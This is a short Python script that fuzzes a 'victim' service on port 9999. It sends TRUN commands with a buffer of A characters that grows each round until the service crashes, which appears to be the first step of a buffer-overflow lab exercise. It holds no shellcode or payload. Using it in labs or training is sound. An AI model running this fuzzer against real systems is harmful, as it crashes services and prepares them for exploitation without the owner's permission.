#!/usr/bin/python
import os  
import sys,socket
from time import sleep
buff = "A" * 100                                                    # Sending 100 * A characters
victimIp = '192.168.100.78'                                         # Enter Victim's IP Address 
victimPort = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        # Create the socket
        s.connect((victimIp,victimPort))
        s.send(('TRUN /.:/' + buff))
        s.close()
        sleep(1)
        buff = buff + "A" * 100
    except:
        print "Fuzzing Crashed at %s bytes" % str(len(buff))
        sys.exit()


